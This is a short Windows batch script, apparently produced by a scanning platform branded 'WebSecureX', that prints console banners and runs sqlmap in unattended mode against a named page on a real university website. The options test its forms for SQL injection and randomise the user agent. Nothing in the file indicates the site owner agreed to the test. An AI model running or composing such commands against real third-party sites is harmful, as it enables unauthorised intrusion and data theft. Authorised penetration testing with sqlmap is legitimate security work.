@echo off
title sqlmap SQL INJECTION ENGINE
color 0A
echo.
echo  [ WebSecureX ] ENGINE: sqlmap SQL INJECTION ENGINE
echo  Powered by WebSecureX Security Platform
echo.
echo  Target: https://pu.edu.pk/home/bs4yearsdegree/BS-4Years-Information-Technology-NC.html
echo.
echo ============================================================
echo  AUDIT IN PROGRESS — DO NOT CLOSE THIS WINDOW
echo ============================================================
echo.
E:\WebSecureX.(2)\venv\Scripts\python.exe ..\engines\sqli_engine\sqlmap\sqlmap.py -u https://pu.edu.pk/home/bs4yearsdegree/BS-4Years-Information-Technology-NC.html --batch --level=2 --risk=1 --forms --random-agent --output-dir=E:\WebSecureX.(2)\python-backend\reports\b92a65af-8e92-4dbd-b801-6353ec87e015\sqlmap
echo.
echo ============================================================
echo  SCAN COMPLETE — This window closes in 30 seconds
echo ============================================================
timeout /t 30 /nobreak > nul